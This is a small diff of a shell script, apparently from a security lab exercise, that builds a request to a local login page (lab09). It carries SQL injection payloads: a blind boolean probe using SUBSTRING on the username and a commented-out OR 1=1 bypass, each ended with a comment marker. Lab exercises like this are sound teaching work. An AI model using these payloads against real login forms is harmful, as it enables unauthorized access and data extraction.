@@ -2,7 +2,7 @@
 
 address="http://localhost/lab09/login.php?u="
 #address+=$1
-address+="\" OR id=98 AND SUBSTRING(username,1,1)='a' " 
+address+="\" OR id = 98 AND SUBSTRING(username,1,1) = 'a' " 
 #address+="\" or 1 = 1"
 address+="\" -- "
 #address+="&p="
